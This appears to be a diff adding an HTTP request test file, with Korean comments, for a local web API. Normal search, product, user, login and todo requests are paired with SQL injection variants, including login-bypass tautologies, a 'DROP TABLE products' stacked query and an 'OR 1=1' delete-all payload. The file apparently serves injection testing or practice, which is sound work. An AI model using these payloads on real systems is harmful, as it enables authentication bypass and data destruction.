@@ -1,3 +1,119 @@
+###1
+### 정상 검색
+GET http://localhost:3000/api/search/electronics
+
+### SQL Injection 검색
+GET http://localhost:3000/api/search/electronics' OR '1'='1
+
+### 정상 추가
+POST http://localhost:3000/api/products
+Content-Type: application/json
+
+{"item":"Pen","price":1.2,"category":"stationery"}
+
+### 삽입 SQL Injection
+POST http://localhost:3000/api/products
+Content-Type: application/json
+
+{"item":"X'); DROP TABLE products;--","price":0,"category":"misc"}
+
+### 단일 조회
+GET http://localhost:3000/api/products/8
+
+### 조회 SQL Injection
+GET http://localhost:3000/api/products/1 OR 1=1
+
+### 삭제
+DELETE http://localhost:3000/api/products/1
+
+### 삭제 SQL Injection
+DELETE http://localhost:3000/api/products/1 OR 1=1
+
+###2
+### 정상 조회
+POST http://localhost:3000/api/user
+Content-Type: application/json
+
+{"userId":"user1"}
+
+### SQL Injection 테스트
+POST http://localhost:3000/api/user
+Content-Type: application/json
+
+{"userId":"user1' OR '1'='1"}
+
+###3
+GET /api/posts/search?keyword=test HTTP/1.1
+Host: localhost:3000
+Accept: application/json
+
+###
+
+POST /api/user HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Accept: application/json
+
+{
+  "id": "1"
+}
+
+###
+
+PUT /api/posts/update HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+Accept: application/json
+
+{
+  "id": "1",
+  "title": "Updated Title",
+  "content": "Updated Content"
+}
+
+###4
+POST /api/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{
+  "username": "testuser",
+  "password": "testpass"
+}
+
+###5
+### ✅ 정상 로그인 요청
+POST http://localhost:3000/api/login
+Content-Type: application/json
+
+{ "username": "testuser", "password": "testpass" }
+
+### 🚨 로그인 SQL Injection 우회 시도
+POST http://localhost:3000/api/login
+Content-Type: application/json
+
+{ "username": "' OR '1'='1'--", "password": "testpass" }
+
+###SE
+
+### ✅ 정상 TODO 삭제 요청
+DELETE http://localhost:3000/api/todo/delete
+Content-Type: application/json
+
+{ "_id": 25 }
+
+###
+
+### 🚨 TODO 전체 삭제 SQL Injection
+DELETE http://localhost:3000/api/todo/delete
+Content-Type: application/json
+
+{ "_id": "1 OR 1=1" }
+
+
+
+
+
 ###6
 ### Update user info
 PUT http://localhost:3000/api/user/update
